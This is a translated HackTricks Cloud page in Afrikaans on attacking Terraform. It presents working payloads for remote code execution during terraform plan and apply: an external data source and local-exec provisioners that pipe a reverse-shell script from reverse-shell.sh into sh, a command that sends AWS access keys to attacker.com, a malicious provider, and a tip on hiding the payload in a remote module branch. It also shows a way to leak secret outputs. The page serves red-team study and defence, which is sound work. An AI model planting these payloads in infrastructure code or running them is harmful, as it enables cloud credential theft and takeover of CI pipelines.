# Terraform Sekuriteit

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

[Van die dokumentasie: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform is 'n **infrastruktuur as kode-hulpmiddel** wat jou in staat stel om beide **wolk- en plaaslike hulpbronne** in mens-leesbare konfigurasie-l√™ers te definieer wat jy kan weergawe, hergebruik en deel. Jy kan dan 'n konsekwente werkstroom gebruik om al jou infrastruktuur deur sy lewensiklus te voorsien en te bestuur. Terraform kan lae-vlak komponente soos berekening, berging en netwerkhulpbronne bestuur, sowel as ho√´-vlak komponente soos DNS-inskrywings en SaaS-funksies.

### Hoe werk Terraform?

Terraform skep en bestuur hulpbronne op wolkplatforms en ander dienste deur middel van hul toepassingsprogrammeerinterfaces (API's). Verskaffers maak dit vir Terraform moontlik om met bykans enige platform of diens met 'n toeganklike API te werk.

![](<../.gitbook/assets/image (33).png>)

HashiCorp en die Terraform-gemeenskap het reeds **meer as 1700 verskaffers** geskryf om duisende verskillende tipes hulpbronne en dienste te bestuur, en hierdie getal bly groei. Jy kan al die openbaar beskikbare verskaffers vind op die [Terraform Register](https://registry.terraform.io/), insluitend Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, en nog baie meer.

Die kern Terraform-werkstroom bestaan uit drie fases:

* **Skryf:** Jy definieer hulpbronne, wat oor verskeie wolkverskaffers en dienste kan wees. Byvoorbeeld, jy kan 'n konfigurasie skep om 'n toepassing op virtuele masjiene in 'n Virtuele Privaatwolk (VPC)-netwerk met sekuriteitsgroepe en 'n vragbalansierder te implementeer.
* **Plan:** Terraform skep 'n uitvoeringsplan wat die infrastruktuur beskryf wat dit sal skep, opdateer of vernietig op grond van die bestaande infrastruktuur en jou konfigurasie.
* **Pas toe:** Op goedkeuring voer Terraform die voorgestelde operasies in die korrekte volgorde uit, met inagneming van enige hulpbronafhanklikhede. Byvoorbeeld, as jy die eienskappe van 'n VPC opdateer en die aantal virtuele masjiene in daardie VPC verander, sal Terraform die VPC herskep voordat dit die virtuele masjiene skaal.

![](<../.gitbook/assets/image (81).png>)

## Terraform Laboratorium

Installeer net terraform op jou rekenaar.

Hier is 'n [gids](https://learn.hashicorp.com/tutorials/terraform/install-cli) en hier is die [beste manier om terraform af te laai](https://www.terraform.io/downloads).

## RCE in Terraform

Terraform het nie 'n platform wat 'n webblad of 'n netwerkdienste blootstel nie, wat beteken dat die enigste manier om terraform te kompromitteer is om in staat te wees om terraform-konfigurasie-l√™ers by te voeg/wysig.

Terraform is egter 'n baie sensitiewe komponent om te kompromitteer omdat dit bevoorregte toegang tot verskillende plekke het sodat dit behoorlik kan werk.

Die hoofmanier vir 'n aanvaller om die stelsel waar terraform uitgevoer word te kompromitteer, is om die bewaarplek wat terraform-konfigurasies stoor, te kompromitteer, omdat dit op 'n stadium ge√Ønterpreteer sal word.

Daar is eintlik oplossings beskikbaar wat terraform plan/apply outomaties uitvoer nadat 'n PR geskep is, soos Atlantis:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

As jy in staat is om 'n terraform-l√™er te kompromitteer, is daar verskillende maniere waarop jy RCE kan uitvoer wanneer iemand `terraform plan` of `terraform apply` uitvoer.

### Terraform plan

Terraform plan is die **mees gebruikte bevel** in terraform en ontwikkelaars/oplossings wat terraform gebruik, roep dit die hele tyd aan, so die **maklikste manier om RCE te kry** is om seker te maak dat jy 'n terraform-konfigurasie-l√™er vergiftig wat arbitr√™re bevele uitvoer in 'n `terraform plan`.

#### Gebruik van 'n eksterne verskaffer

Terraform bied die [`external`-verskaffer](https://registry.terraform.io/providers/hashicorp/external/latest/docs) aan wat 'n manier bied om tussen Terraform en eksterne programme te skakel. Jy kan die `external`-data-bron gebruik om arbitr√™re kode uit te voer tydens 'n `plan`.

Deur iets soos die volgende in 'n terraform-konfigurasie-l√™er in te voeg, sal 'n omgekeerde skulp uitgevoer word wanneer jy `terraform plan` uitvoer:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Gebruik van 'n aangepaste verskaffer

'n Aanvaller kan 'n [aangepaste verskaffer](https://learn.hashicorp.com/tutorials/terraform/provider-setup) na die [Terraform Register](https://registry.terraform.io/) stuur en dit dan by die Terraform-kode in 'n funksie-tak voeg ([voorbeeld van hier](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Die verskaffer word afgelaai in die `init` en sal die skadelike kode uitvoer wanneer `plan` uitgevoer word.

'n Voorbeeld kan gevind word by [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Die gebruik van 'n eksterne verwysing

Beide genoemde opsies is nuttig, maar nie baie onopvallend nie (die tweede is meer onopvallend, maar ingewikkelder as die eerste). Jy kan hierdie aanval selfs op 'n **meer onopvallende manier** uitvoer deur hierdie voorstelle te volg:

* In plaas daarvan om die omgekeerde skulp direk in die terraform-l√™er by te voeg, kan jy 'n **eksterne bron laai** wat die omgekeerde skulp bevat:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Jy kan die rev shell-kode vind by [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* In die eksterne bron, gebruik die **ref**-funksie om die **terraform rev shell-kode in 'n tak** binne die repo te verberg, iets soos: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply sal uitgevoer word om alle veranderinge toe te pas, jy kan dit ook misbruik om RCE te verkry deur **'n kwaadwillige Terraform-l√™er in te spuit met** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Jy moet net seker maak dat 'n payload soos die volgende in die `main.tf`-l√™er eindig:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Volg die **voorstellings van die vorige tegniek** om hierdie aanval op 'n **meer verborge manier met eksterne verwysings** uit te voer.

## Geheime Uitlek

Jy kan **geheime waardes wat deur terraform gebruik word, uitlek** deur `terraform apply` uit te voer deur iets soos die volgende by die terraform-l√™er te voeg:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Ouditgereedskap

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec gebruik statiese analise van jou terraform-kode om potensi√´le verkeerde konfigurasies op te spoor.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan is 'n statiese koderanaliseerder vir Infrastruktuur as Kode.

## Verwysings

* [Atlantis-sekuriteit](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
